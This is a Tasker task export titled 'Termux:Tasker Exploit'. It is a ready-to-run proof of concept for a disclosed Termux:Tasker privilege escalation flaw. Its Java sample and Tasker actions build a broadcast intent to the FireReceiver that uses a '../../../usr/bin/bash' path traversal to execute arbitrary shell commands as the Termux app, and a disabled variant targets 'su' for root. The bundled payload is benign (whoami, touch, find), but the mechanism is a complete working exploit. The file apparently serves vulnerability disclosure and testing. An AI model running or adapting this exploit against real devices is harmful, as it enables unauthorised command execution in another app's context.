<TaskerData sr="" dvi="1" tv="5.11.6.beta">
	<Task sr="task980">
		<cdate>1602203101316</cdate>
		<edate>1604039579884</edate>
		<id>980</id>
		<nme>Termux:Tasker Exploit</nme>
		<pri>100</pri>
		<Action sr="act0" ve="7">
			<code>300</code>
			<label>Termux:Tasker exploit task as detailed in https:termux.github.io/general/2022/02/15/termux-apps-vulnerability-disclosures.html#1-termux-tasker-privilege-escalation-vulnerability.

Sample java code:
```
Intent intent = new Intent("com.twofortyfouram.locale.intent.action.FIRE_SETTING");
intent.setClassName("com.termux.tasker", "com.termux.tasker.FireReceiver");

Bundle bundle = new Bundle();
bundle.putString("com.termux.tasker.extra.EXECUTABLE", "../../../usr/bin/bash");
bundle.putString("com.termux.execute.arguments", "-c \"echo -n 'I am '; whoami; echo 'creating exploit-file'; touch exploit-file; echo 'finding exploit-file'; find . -name exploit-file 2&gt;/dev/null; sleep 5;\"");
bundle.putBoolean("com.termux.tasker.extra.TERMINAL", true);
bundle.putInt("com.termux.tasker.extra.VERSION_CODE", 4);

intent.putExtra("com.twofortyfouram.locale.intent.extra.BUNDLE", bundle);
context.sendBroadcast(intent);
```

This task does not take any parameters or return anything.</label>
		</Action>
		<Action sr="act1" ve="7">
			<code>300</code>
			<label>Set constant values for intent</label>
		</Action>
		<Action sr="act10" ve="7">
			<code>300</code>
			<label>Set Termux:Plugin extra values</label>
		</Action>
		<Action sr="act11" ve="7">
			<code>547</code>
			<label>termux privileges</label>
			<Str sr="arg0" ve="3">%executable</Str>
			<Str sr="arg1" ve="3">../../../usr/bin/bash</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act12" ve="7">
			<code>547</code>
			<label>termux privileges</label>
			<Str sr="arg0" ve="3">%arguments</Str>
			<Str sr="arg1" ve="3">-c "echo -n 'I am '; whoami; echo 'creating exploit-file'; touch exploit-file; echo 'finding exploit-file'; find . -name exploit-file 2&gt;/dev/null; sleep 5;"</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act13" ve="7">
			<code>547</code>
			<label>root privileges</label>
			<on>false</on>
			<Str sr="arg0" ve="3">%executable</Str>
			<Str sr="arg1" ve="3">../../../usr/bin/su</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act14" ve="7">
			<code>547</code>
			<label>root privileges</label>
			<on>false</on>
			<Str sr="arg0" ve="3">%arguments</Str>
			<Str sr="arg1" ve="3">-c "echo -n 'I am '; whoami; echo 'creating exploit-file'; touch exploit-file; echo 'finding exploit-file'; find . -name exploit-file 2&gt;/dev/null; sleep 5;"</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act15" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%terminal</Str>
			<Str sr="arg1" ve="3">true</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act16" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%version_code</Str>
			<Str sr="arg1" ve="3">4</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act17" ve="7">
			<code>300</code>
			<label>Create a "com.twofortyfouram.locale.intent.action.FIRE_SETTING" action intent</label>
		</Action>
		<Action sr="act18" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3">intent</Str>
			<Str sr="arg1" ve="3">Intent</Str>
			<Str sr="arg2" ve="3">new
{Intent} (String)</Str>
			<Str sr="arg3" ve="3">%action_fire_setting</Str>
			<Str sr="arg4" ve="3"/>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act19" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3"/>
			<Str sr="arg1" ve="3">intent</Str>
			<Str sr="arg2" ve="3">setClassName
{Intent} (String, String)</Str>
			<Str sr="arg3" ve="3">%termux_tasker_package</Str>
			<Str sr="arg4" ve="3">%termux_tasker_firereceiver</Str>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act2" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%action_fire_setting</Str>
			<Str sr="arg1" ve="3">com.twofortyfouram.locale.intent.action.FIRE_SETTING</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act20" ve="7">
			<code>300</code>
			<label>Create "com.twofortyfouram.locale.intent.extra.BUNDLE" bundle to put Termux:Plugin extras</label>
		</Action>
		<Action sr="act21" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3">bundle</Str>
			<Str sr="arg1" ve="3">Bundle</Str>
			<Str sr="arg2" ve="3">new
{Bundle} ()</Str>
			<Str sr="arg3" ve="3"/>
			<Str sr="arg4" ve="3"/>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act22" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3"/>
			<Str sr="arg1" ve="3">bundle</Str>
			<Str sr="arg2" ve="3">putString
{} (String, String)</Str>
			<Str sr="arg3" ve="3">%extra_executable</Str>
			<Str sr="arg4" ve="3">%executable</Str>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act23" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3"/>
			<Str sr="arg1" ve="3">bundle</Str>
			<Str sr="arg2" ve="3">putString
{} (String, String)</Str>
			<Str sr="arg3" ve="3">%extra_arguments</Str>
			<Str sr="arg4" ve="3">%arguments</Str>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act24" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3"/>
			<Str sr="arg1" ve="3">bundle</Str>
			<Str sr="arg2" ve="3">putBoolean
{} (String, boolean)</Str>
			<Str sr="arg3" ve="3">%extra_terminal</Str>
			<Str sr="arg4" ve="3">%terminal</Str>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act25" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3"/>
			<Str sr="arg1" ve="3">bundle</Str>
			<Str sr="arg2" ve="3">putInt
{} (String, int)</Str>
			<Str sr="arg3" ve="3">%extra_version_code</Str>
			<Str sr="arg4" ve="3">%version_code</Str>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act26" ve="7">
			<code>300</code>
			<label>Put bundle into intent and start intent</label>
		</Action>
		<Action sr="act27" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3"/>
			<Str sr="arg1" ve="3">intent</Str>
			<Str sr="arg2" ve="3">putExtra
{Intent} (String, Bundle)</Str>
			<Str sr="arg3" ve="3">%extra_bundle</Str>
			<Str sr="arg4" ve="3">bundle</Str>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act28" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3">%intent_uri</Str>
			<Str sr="arg1" ve="3">intent</Str>
			<Str sr="arg2" ve="3">toURI
{String} ()</Str>
			<Str sr="arg3" ve="3">0</Str>
			<Str sr="arg4" ve="3"/>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act29" ve="7">
			<code>105</code>
			<Str sr="arg0" ve="3">%intent_uri</Str>
			<Int sr="arg1" val="0"/>
		</Action>
		<Action sr="act3" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%extra_bundle</Str>
			<Str sr="arg1" ve="3">com.twofortyfouram.locale.intent.extra.BUNDLE</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act30" ve="7">
			<code>664</code>
			<Str sr="arg0" ve="3"/>
			<Str sr="arg1" ve="3">CONTEXT</Str>
			<Str sr="arg2" ve="3">sendBroadcast
{} (Intent)</Str>
			<Str sr="arg3" ve="3">intent</Str>
			<Str sr="arg4" ve="3"/>
			<Str sr="arg5" ve="3"/>
			<Str sr="arg6" ve="3"/>
			<Str sr="arg7" ve="3"/>
			<Str sr="arg8" ve="3"/>
			<Str sr="arg9" ve="3"/>
		</Action>
		<Action sr="act4" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%extra_executable</Str>
			<Str sr="arg1" ve="3">com.termux.tasker.extra.EXECUTABLE</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act5" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%extra_arguments</Str>
			<Str sr="arg1" ve="3">com.termux.execute.arguments</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act6" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%extra_terminal</Str>
			<Str sr="arg1" ve="3">com.termux.tasker.extra.TERMINAL</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act7" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%extra_version_code</Str>
			<Str sr="arg1" ve="3">com.termux.tasker.extra.VERSION_CODE</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act8" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%termux_tasker_package</Str>
			<Str sr="arg1" ve="3">com.termux.tasker</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
		<Action sr="act9" ve="7">
			<code>547</code>
			<Str sr="arg0" ve="3">%termux_tasker_firereceiver</Str>
			<Str sr="arg1" ve="3">com.termux.tasker.FireReceiver</Str>
			<Int sr="arg2" val="0"/>
			<Int sr="arg3" val="0"/>
			<Int sr="arg4" val="0"/>
			<Int sr="arg5" val="3"/>
		</Action>
	</Task>
</TaskerData>
